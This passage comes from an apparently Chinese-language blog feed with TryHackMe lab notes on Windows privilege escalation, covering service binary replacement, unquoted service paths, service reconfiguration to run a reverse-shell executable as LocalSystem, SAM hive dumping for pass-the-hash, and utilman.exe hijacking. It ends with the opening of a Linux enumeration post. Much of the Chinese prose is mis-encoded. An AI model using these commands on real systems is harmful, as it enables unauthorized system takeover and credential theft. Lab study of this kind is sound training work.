alt="image-20240809180845623"></p><h3 id="æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ä¸å®‰å…¨"><a href="#æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ä¸å®‰å…¨" class="headerlink" title="æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ä¸å®‰å…¨"></a>æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ä¸å®‰å…¨</h3><p>æŸé¡¹æœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ç›¸å¯¹æ¥è¯´è¾ƒå¼±ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹å¯æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091834411.png" alt="image-20240809183435236"></p><p>å¯¹äºä¸Šé¢æœåŠ¡æ‰§è¡Œçš„ç”¨æˆ·æ˜¯svcusr1ï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091839198.png" alt="image-20240809183934118"></p><p>everyoneç»„å…·æœ‰Mæƒé™(å¯ä¿®æ”¹æƒé™)</p><p>é¦–å…ˆåˆ©ç”¨msfvenomç”Ÿæˆä¸€ä¸ªåå¼¹shellçš„exeæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091853700.png" alt="image-20240809185310630"></p><p>ç„¶åå¼€ä¸€ä¸ªpythonæœåŠ¡ï¼Œåˆ©ç”¨wgetæŠŠexeæ–‡ä»¶æ”¾åˆ°powshellä¸­</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091901121.png" alt="image-20240809190155020"></p><p>ç„¶åå°†æƒé™å¼±çš„å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œä¸€ä¸ªå¤‡ä»½ï¼Œå¹¶å°†ç”Ÿæˆçš„æ¶æ„æ–‡ä»¶æ›¿æ¢åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®ï¼Œç„¶åå†èµ‹äºˆä¸€ä¸ªFæƒé™ã€‚</p><p><code>move WService.exe WService.exe.bkp</code></p><p><code>move C:\Users\thm-unpriv\rev-svc.exe WService.exe</code></p><p><code>icacls WService.exe /grant Everyone:F</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091904751.png" alt="image-20240809190407596"></p><p>æœ€åå†æ”»å‡»æœºä¸Šç›‘å¬ç«¯å£ï¼Œå¹¶å†windowsä¸Šé‡å¯æœåŠ¡ã€‚</p><p> <code>sc stop windowsscheduler</code></p><p> <code>sc start windowsscheduler</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091906501.png" alt="image-20240809190646410"></p><h3 id="æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„"><a href="#æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„" class="headerlink" title="æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„"></a>æœªåŠ å¼•å·çš„æœåŠ¡è·¯å¾„</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012042594.png" alt="image-20240901204211485"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™ä¸ªæœåŠ¡æ˜¯æ²¡æœ‰å¼•å·çš„ï¼Œå¹¶ä¸”Disk Sorter Enterpriseä¸­é—´æ˜¯æœ‰ç©ºæ ¼çš„ï¼ŒSCMä¸çŸ¥é“æ‰§è¡Œå“ªä¸€é¡¹ å°±ä¼šå‡ºç°ä¸‹é¢çš„æƒ…å†µã€‚</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Argument 1</td><td>Argument 2</td></tr><tr><td>C:\MyPrograms\Disk.exe</td><td>Sorter</td><td>Enterprise\bin\disksrs.exe</td></tr><tr><td>C:\MyPrograms\Disk Sorter.exe</td><td>Enterprise\bin\disksrs.exe</td><td></td></tr><tr><td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td><td></td><td></td></tr></tbody></table><p>è¿™ä¸å‘½ä»¤æç¤ºç¬¦è§£æå‘½ä»¤çš„æ–¹å¼æœ‰å…³ã€‚é€šå¸¸ï¼Œå½“æ‚¨å‘é€å‘½ä»¤æ—¶ï¼Œç©ºæ ¼ç”¨ä½œå‚æ•°åˆ†éš”ç¬¦ï¼Œé™¤éå®ƒä»¬æ˜¯å¸¦å¼•å·çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚è¿™æ„å‘³ç€å¯¹æœªå¸¦å¼•å·çš„å‘½ä»¤çš„â€œæ­£ç¡®â€è§£é‡Šæ˜¯æ‰§è¡Œ<code>C:\\MyPrograms\\Disk.exe</code>å¹¶å°†å…¶ä½™éƒ¨åˆ†ä½œä¸ºå‚æ•°ã€‚</p><p>SCM å¹¶æ²¡æœ‰åƒå®ƒåº”è¯¥çš„é‚£æ ·å¤±è´¥ï¼Œè€Œæ˜¯å°è¯•å¸®åŠ©ç”¨æˆ·å¹¶å¼€å§‹æŒ‰ç…§è¡¨ä¸­æ˜¾ç¤ºçš„é¡ºåºæœç´¢æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p><ol><li>é¦–å…ˆï¼Œæœç´¢<code>C:\\MyPrograms\\Disk.exe</code>ã€‚å¦‚æœå­˜åœ¨ï¼ŒæœåŠ¡å°†è¿è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li>å¦‚æœåè€…ä¸å­˜åœ¨ï¼Œå®ƒå°±ä¼šæœç´¢<code>C:\\MyPrograms\\Disk Sorter.exe</code>ã€‚å¦‚æœå­˜åœ¨ï¼ŒæœåŠ¡å°±ä¼šè¿è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li>å¦‚æœåè€…ä¸å­˜åœ¨ï¼Œå®ƒå°†æœç´¢<code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>ã€‚æ­¤é€‰é¡¹é¢„è®¡ä¼šæˆåŠŸï¼Œå¹¶ä¸”é€šå¸¸ä¼šåœ¨é»˜è®¤å®‰è£…ä¸­è¿è¡Œã€‚</li></ol><p>ä»è¿™ä¸ªè¡Œä¸ºå¯ä»¥çœ‹å‡ºé—®é¢˜æ‰€åœ¨ã€‚å¦‚æœæ”»å‡»è€…åˆ›å»ºåœ¨é¢„æœŸæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰æœç´¢çš„ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»–ä»¬å°±å¯ä»¥å¼ºåˆ¶æœåŠ¡è¿è¡Œä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¼šé»˜è®¤å®‰è£…åœ¨C:\Program Files æˆ– C:\Program Files (x86) ä¸‹ã€‚éç‰¹æƒç”¨æˆ·ä¸å¯å†™ï¼Œä½†æœ‰äº›æœåŠ¡ä¼šæ›´æ”¹å®ƒçš„é»˜è®¤å®‰è£…ä½ç½®ï¼Œå¦‚æœè¿™äº›æœåŠ¡çš„å®‰è£…ä½ç½®æ˜¯æˆ‘ä»¬å¯ä»¥æ›´æ”¹çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¼æ´å°±å®¹æ˜“è¢«åˆ©ç”¨ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012103259.png" alt="image-20240901210353113"></p><p>è¯¥<code>BUILTIN\\Users</code>ç»„å…·æœ‰<strong>AD</strong>å’Œ<strong>WD</strong>æƒé™ï¼Œåˆ†åˆ«å…è®¸ç”¨æˆ·åˆ›å»ºå­ç›®å½•å’Œæ–‡ä»¶ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬åˆ©ç”¨linuxç”Ÿæˆä¸€ä¸ªåå¼¹shellçš„exeæ–‡ä»¶ï¼Œä¸Šä¼ è¿›å»ï¼Œç„¶åå°†è¿™ä¸ªexeæ–‡ä»¶ç§»åŠ¨åˆ°C:\MyPrograms\Disk.exeä¸­ï¼Œå¯¹è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶èµ‹äºˆå…¨éƒ¨æƒé™ï¼Œæœ€åé‡å¯è¿™ä¸ªæœåŠ¡å³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012119276.png" alt="image-20240901211917190"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012122578.png" alt="image-20240901212210441"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012127201.png" alt="image-20240901212754030"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012128551.png" alt="image-20240901212805459"></p><h3 id="ä¸å®‰å…¨çš„æœåŠ¡æƒé™"><a href="#ä¸å®‰å…¨çš„æœåŠ¡æƒé™" class="headerlink" title="ä¸å®‰å…¨çš„æœåŠ¡æƒé™"></a>ä¸å®‰å…¨çš„æœåŠ¡æƒé™</h3><p>å¦‚æœæœåŠ¡çš„å¯æ‰§è¡Œ DACL é…ç½®(æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™)æ­£ç¡®ï¼Œå¹¶ä¸”æœåŠ¡çš„äºŒè¿›åˆ¶è·¯å¾„å¼•ç”¨æ­£ç¡®ï¼Œæ‚¨ä»æœ‰ä¸€çº¿æœºä¼šåˆ©ç”¨è¯¥æœåŠ¡ã€‚å¦‚æœæœåŠ¡ DACLï¼ˆä¸æ˜¯æœåŠ¡çš„å¯æ‰§è¡ŒDACLï¼‰å…è®¸æ‚¨ä¿®æ”¹æœåŠ¡çš„é…ç½®ï¼Œæ‚¨å°†èƒ½å¤Ÿé‡æ–°é…ç½®è¯¥æœåŠ¡ã€‚è¿™å°†å…è®¸æ‚¨æŒ‡å‘æ‚¨éœ€è¦çš„ä»»ä½•å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨æ‚¨å–œæ¬¢çš„ä»»ä½•å¸æˆ·è¿è¡Œå®ƒï¼ŒåŒ…æ‹¬ SYSTEM æœ¬èº«ã€‚</p><p><strong>æœåŠ¡DACLæ˜¯å¯¹æœåŠ¡æœ¬èº«çš„æ§åˆ¶</strong></p><p>è¦ä»å‘½ä»¤è¡Œæ£€æŸ¥æœåŠ¡ DACLï¼Œå¯ä»¥ä½¿ç”¨Sysinternals å¥—ä»¶ä¸­çš„<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229436.png" alt="image-20240901222954169"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229891.png" alt="image-20240901222938643"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥<code>BUILTIN\\Users</code>ç»„å…·æœ‰SERVICE_ALL_ACCESSæƒé™ï¼Œè¿™æ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥é‡æ–°é…ç½®è¯¥æœåŠ¡ã€‚</p><p>ç„¶åæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªåå¼¹shellçš„exeæ–‡ä»¶ï¼Œä¸Šä¼ ä¸Šå»ï¼Œä¿®æ”¹å…¶æƒé™ï¼Œç„¶åæ›´æ”¹æœåŠ¡å…³è”çš„å¯æ‰§è¡Œæ–‡ä»¶å’Œå¸æˆ·ï¼Œæœ€åé‡å¯æœåŠ¡ï¼Œç­‰å¾…åå¼¹shellã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012235967.png" alt="image-20240901223501856"></p><p><code>sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012236789.png" alt="image-20240901223633706"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012244754.png" alt="image-20240901224455692"></p><h2 id="æ»¥ç”¨å±é™©ç‰¹æƒ"><a href="#æ»¥ç”¨å±é™©ç‰¹æƒ" class="headerlink" title="æ»¥ç”¨å±é™©ç‰¹æƒ"></a>æ»¥ç”¨å±é™©ç‰¹æƒ</h2><h3 id="Windows-æƒé™"><a href="#Windows-æƒé™" class="headerlink" title="Windows æƒé™"></a>Windows æƒé™</h3><p>ç‰¹æƒæ˜¯å¸æˆ·æ‰§è¡Œç‰¹å®šç³»ç»Ÿç›¸å…³ä»»åŠ¡çš„æƒåˆ©ã€‚è¿™äº›ä»»åŠ¡å¯ä»¥ç®€å•åˆ°å…³é—­æœºå™¨çš„ç‰¹æƒï¼Œä¹Ÿå¯ä»¥æ˜¯ç»•è¿‡æŸäº›åŸºäºDACLçš„è®¿é—®æ§åˆ¶çš„ç‰¹æƒã€‚</p><p>æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ç»„åˆ†é…çš„æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">whoami /priv<br></code></pre></td></tr></table></figure><p><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</a> æä¾›äº† Windows ç³»ç»Ÿä¸Šå¯ç”¨æƒé™çš„å®Œæ•´åˆ—è¡¨ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œåªæœ‰é‚£äº›å…è®¸æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­å‡çº§çš„æƒé™æ‰æ˜¯å€¼å¾—å…³æ³¨çš„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ <a href="https://github.com/gtworek/Priv2Admin/blob/master/README.md">https://github.com/gtworek/Priv2Admin/blob/master/README.md</a>  ä¸Šæ‰¾åˆ°å¯åˆ©ç”¨æƒé™çš„å®Œæ•´åˆ—è¡¨ã€‚</p><h3 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup/SeRestore"></a>SeBackup/SeRestore</h3><p>SeBackup å’Œ SeRestore æƒé™å…è®¸ç”¨æˆ·è¯»å–å’Œå†™å…¥ç³»ç»Ÿä¸­çš„ä»»ä½•æ–‡ä»¶ï¼Œè€Œå¿½ç•¥ä»»ä½•ç°æœ‰çš„DACLã€‚æ­¤æƒé™èƒŒåçš„æƒ³æ³•æ˜¯å…è®¸æŸäº›ç”¨æˆ·ä»ç³»ç»Ÿæ‰§è¡Œå¤‡ä»½ï¼Œè€Œæ— éœ€å®Œå…¨ç®¡ç†æƒé™ã€‚</p><p>æœ‰äº†è¿™ç§èƒ½åŠ›ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨å¤šç§æŠ€æœ¯è½»æ¾æå‡ç³»ç»Ÿæƒé™ã€‚æˆ‘ä»¬å°†è¦ç ”ç©¶çš„æŠ€æœ¯åŒ…æ‹¬å¤åˆ¶ SAM å’Œ SYSTEM æ³¨å†Œè¡¨é…ç½®å•å…ƒä»¥æå–æœ¬åœ°ç®¡ç†å‘˜çš„å¯†ç å“ˆå¸Œã€‚</p><p>æˆ‘ä»¬ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€powshellæ‰èƒ½ä½¿ç”¨ä¸Šé¢çš„æƒé™ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€åéœ€è¦å†æ¬¡è¾“å…¥æ­¤è´¦æˆ·çš„å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031546279.png" alt="image-20240903154626152"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031547977.png" alt="image-20240903154758909"></p><p>æ•´ä½“çš„æ”»å‡»æ€è·¯:</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆå¤‡ä»½samå’Œsystemçš„å“ˆå¸Œï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨SMBæœåŠ¡æˆ–è€…å…¶ä»–çš„ï¼Œå°†è¿™ä¸¤ä¸ªå¤‡ä»½çš„hashæ–‡ä»¶ä¼ é€’åˆ°æ”»å‡»æœºä¸Šé¢ï¼Œç„¶åæ£€ç´¢ç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°administratorçš„å“ˆå¸Œå€¼</p><p>æœ€ç»ˆå¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜çš„å“ˆå¸Œæ‰§è¡Œä¼ é€’å“ˆå¸Œæ”»å‡»ï¼Œå¹¶ä»¥ SYSTEM æƒé™è®¿é—®ç›®æ ‡æœºå™¨.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031611062.png" alt="image-20240903161147004"></p><p>æ­¤æ—¶å·²ç»å¤‡ä»½æˆåŠŸã€‚</p><p>ç„¶åå¯åŠ¨smbæœåŠ¡ï¼Œåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªshareç›®å½•ä½œä¸ºå…±äº«çš„publicç›®å½•ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031620802.png" alt="image-20240903162004730"></p><p>å°†ä¸¤ä¸ªå¤‡ä»½æ–‡ä»¶ä¼ é€’åˆ°publicç›®å½•ä¸Šå»ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031628623.png" alt="image-20240903162833498"></p><p>ç„¶åæ£€ç´¢hash.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031632347.png" alt="image-20240903163251253"></p><p>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿå¾—åˆ°administratorçš„hash.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031635718.png" alt="image-20240903163517545"></p><p>æœ€åä¹Ÿæ˜¯æˆåŠŸçš„å¾—åˆ°äº†administratoræƒé™ã€‚</p><h3 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h3><p>SeTakeOwnership æƒé™å…è®¸ç”¨æˆ·è·å–ç³»ç»Ÿä¸Šä»»ä½•å¯¹è±¡çš„æ‰€æœ‰æƒï¼ŒåŒ…æ‹¬æ–‡ä»¶å’Œæ³¨å†Œè¡¨é¡¹ï¼Œè¿™ä¸ºæ”»å‡»è€…æå‡æƒé™æä¾›äº†è®¸å¤šå¯èƒ½æ€§ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢ä»¥ SYSTEM èº«ä»½è¿è¡Œçš„æœåŠ¡å¹¶è·å–è¯¥æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„æ‰€æœ‰æƒã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031654370.png" alt="image-20240903165417290"></p><p>è¿™æ¬¡æˆ‘ä»¬å°†åˆ©ç”¨<code>utilman.exe</code>æ¥æå‡æƒé™ã€‚Utilman æ˜¯ä¸€æ¬¾å†…ç½® Windows åº”ç”¨ç¨‹åºï¼Œç”¨äºåœ¨é”å®šå±å¹•æœŸé—´æä¾›è½»æ¾è®¿é—®é€‰é¡¹ï¼š</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031707081.png" alt="image-20240903170729988"></p><p>ç”±äº Utilman ä»¥ SYSTEM æƒé™è¿è¡Œï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬å°†åŸå§‹äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºæˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•æœ‰æ•ˆè½½è·ï¼Œæˆ‘ä»¬å°†æœ‰æ•ˆåœ°è·å¾— SYSTEM æƒé™ã€‚ç”±äºæˆ‘ä»¬å¯ä»¥è·å¾—ä»»ä½•æ–‡ä»¶çš„æ‰€æœ‰æƒï¼Œå› æ­¤æ›¿æ¢å®ƒå¾ˆç®€å•ã€‚</p><p>ä¸‹é¢æ˜¯æ•´ä½“æ”»å‡»æ€è·¯ï¼š</p><p>é¦–å…ˆæˆ‘ä»¬è·å–utilman.exeçš„æ‰€æœ‰æƒï¼Œç„¶åæˆ‘ä»¬å¯¹å½“å‰æ‰€åœ¨ç”¨æˆ·èµ‹äºˆå¯¹utilman.exeçš„å®Œå…¨æ§åˆ¶çš„æƒé™ï¼Œæ¥ç€ç”¨ cmd.exe çš„å‰¯æœ¬æ›¿æ¢ utilman.exeï¼Œæœ€åå†è§¦å‘utilman.exeå³å¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031718432.png" alt="image-20240903171856361"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031719957.png" alt="image-20240903171924694"></p><h3 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate/SeAssignPrimaryToken"></a>SeImpersonate/SeAssignPrimaryToken</h3><p>è¿™äº›æƒé™å…è®¸è¿›ç¨‹æ¨¡æ‹Ÿå…¶ä»–ç”¨æˆ·å¹¶ä»£è¡¨ä»–ä»¬è¡Œäº‹ã€‚æ¨¡æ‹Ÿé€šå¸¸åŒ…æ‹¬èƒ½å¤Ÿåœ¨å¦ä¸€ä¸ªç”¨æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ç”Ÿæˆè¿›ç¨‹æˆ–çº¿ç¨‹ã€‚</p><p>æ²¡çœ‹æ‡‚ä»€ä¹ˆæ„æ€â€¦</p><h2 id="æ»¥ç”¨æ˜“å—æ”»å‡»çš„è½¯ä»¶"><a href="#æ»¥ç”¨æ˜“å—æ”»å‡»çš„è½¯ä»¶" class="headerlink" title="æ»¥ç”¨æ˜“å—æ”»å‡»çš„è½¯ä»¶"></a>æ»¥ç”¨æ˜“å—æ”»å‡»çš„è½¯ä»¶</h2><h3 id="æœªæ‰“è¡¥ä¸çš„è½¯ä»¶"><a href="#æœªæ‰“è¡¥ä¸çš„è½¯ä»¶" class="headerlink" title="æœªæ‰“è¡¥ä¸çš„è½¯ä»¶"></a>æœªæ‰“è¡¥ä¸çš„è½¯ä»¶</h3><p>ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…çš„è½¯ä»¶å¯ä»¥æä¾›å„ç§ç‰¹æƒæå‡æœºä¼šã€‚ä¸é©±åŠ¨ç¨‹åºä¸€æ ·ï¼Œç»„ç»‡å’Œç”¨æˆ·å¯èƒ½ä¸ä¼šåƒæ›´æ–°æ“ä½œç³»ç»Ÿé‚£æ ·é¢‘ç¹åœ°æ›´æ–°å®ƒä»¬ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¯¥ <code>wmic</code> å·¥å…·åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…çš„è½¯ä»¶åŠå…¶ç‰ˆæœ¬ã€‚ä»¥ä¸‹å‘½ä»¤å°†è½¬å‚¨å®ƒå¯ä»¥æ”¶é›†çš„æœ‰å…³å·²å®‰è£…è½¯ä»¶çš„ä¿¡æ¯.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">wmic product get name,version,vendor<br></code></pre></td></tr></table></figure><p>æœ‰çš„æ—¶å€™ï¼Œè¿™å¹¶ä¸èƒ½ç»™å‡ºæ‰€æœ‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„æ¡Œé¢å¿«æ·æ–¹å¼ï¼Œå¯ç”¨æœåŠ¡æˆ–é€šå¸¸ä»»ä½•è¡¨æ˜å¯èƒ½å­˜åœ¨å…¶ä»–æ˜“å—æ”»å‡»çš„è½¯ä»¶çš„ç—•è¿¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031839409.png" alt="image-20240903183956263"></p><p>ä¸‹é¢æ˜¯ä¸€äº›å·¥å…·ï¼š</p><p>WinPEAS <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031849604.png" alt="image-20240903184931481"></p><p>PrivescCheck <a href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850008.png" alt="image-20240903185011924"></p><p>WES-NG <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850965.png" alt="image-20240903185038892"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†linuxææƒ</title>
    <link href="/2024/07/30/linux%E6%8F%90%E6%9D%83/"/>
    <url>/2024/07/30/linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Linuxææƒ"><a href="#Linuxææƒ" class="headerlink" title="Linuxææƒ"></a>Linuxææƒ</h1><p>ç®€å•æ¥è®²ï¼Œææƒå°±æ˜¯å°†ä¸€ä¸ªä½æƒé™ç”¨æˆ·åˆ©ç”¨ç³»ç»Ÿçš„æ¼æ´ï¼Œè®¾è®¡ç¼ºé™·ç­‰æå‡åˆ°ä¸€ä¸ªé«˜æƒé™ç”¨æˆ·çš„è¿‡ç¨‹ã€‚</p><h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h2><p>å°±æ˜¯è¿›ä¸€æ­¥çš„è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚</p><h3 id="hostname"><a href="#hostname" class="headerlink" title="hostname"></a>hostname</h3><p>è¿”å›ç›®æ ‡æœºå™¨çš„ä¸»æœºåï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥æä¾›æœ‰å…³ç›®æ ‡ç³»ç»Ÿåœ¨å…¬å¸ç½‘ç»œä¸­çš„è§’è‰²çš„ä¿¡æ¯ã€‚</p><h3 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a>uname -a</h3><p>æ‰“å°ç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºæˆ‘ä»¬æä¾›æœ‰å…³ç³»ç»Ÿä½¿ç”¨çš„å†…æ ¸çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚</p><h3 id="proc-version"><a href="#proc-version" class="headerlink" title="/proc/version"></a>/proc/version</h3><p>æä¾›æœ‰å…³ç›®æ ‡ç³»ç»Ÿè¿›ç¨‹çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹<code>/proc/version</code>å¯èƒ½ä¼šä¸ºæ‚¨æä¾›æœ‰å…³å†…æ ¸ç‰ˆæœ¬çš„ä¿¡æ¯å’Œå…¶ä»–æ•°æ®ï¼Œä¾‹å¦‚æ˜¯å¦å®‰è£…äº†ç¼–è¯‘å™¨ï¼ˆä¾‹å¦‚ GCCï¼‰ã€‚</p><h3 id="etc-issue"><a href="#etc-issue" class="headerlink" title="/etc/issue"></a>/etc/issue</h3><p>é€šè¿‡æŸ¥çœ‹<code>/etc/issue</code>æ–‡ä»¶æ¥è¯†åˆ«ç³»ç»Ÿã€‚</p><h3 id="ps-Command"><a href="#ps-Command" class="headerlink" title="ps Command"></a>ps Command</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407311955973.png" alt="image-20240731195547857"></p><p>PIDæ˜¯è¿›ç¨‹å· TTYæ˜¯ç”¨æˆ·ä½¿ç”¨çš„ç»ˆç«¯ç±»å‹ TIMEæ˜¯è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´ CMDæ˜¯æ­£åœ¨è¿è¡Œçš„å‘½ä»¤æˆ–å¯æ‰§è¡Œæ–‡ä»¶</p><p><code>ps -A</code> æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</p><p><code>ps axjf</code>ï¼šæŸ¥çœ‹è¿›ç¨‹æ ‘</p><p><code>ps aux</code>: <code>aux</code> 